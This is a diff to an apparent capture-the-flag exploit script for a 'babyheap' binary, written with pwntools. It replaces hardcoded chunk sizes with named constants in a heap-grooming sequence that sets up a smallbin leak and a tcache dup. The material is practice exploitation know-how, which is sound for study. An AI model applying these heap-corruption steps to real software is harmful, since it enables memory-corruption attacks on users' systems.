@@ -9,6 +9,9 @@ r = None
 #e = ELF('./babyheap')
 #libc = ELF('./libc.so')
 
+fast = 0xf8
+small = 0x178
+
 context.log_level = 'DEBUG'
 
 def malloc(size, content='a'):
@@ -34,17 +37,17 @@ def show(idx):
 def main():
     global r
     # Get smallbin leak
-    malloc(0x178) #smallbin size
-    malloc(0x178)
-    malloc(0x178)
-    malloc(0x178)
-    malloc(0x178)
+    malloc(small)
+    malloc(small)
+    malloc(small)
+    malloc(small)
+    malloc(small)
     free(0)
     free(1)
     free(2)
     free(3)
-    malloc(0xf8, cyclic(0xf8))
-    malloc(0x178, cyclic(0x178))
+    malloc(fast, cyclic(fast))
+    malloc(small, cyclic(small))
     gdb.attach(r)
 
     # Get a tcache dup
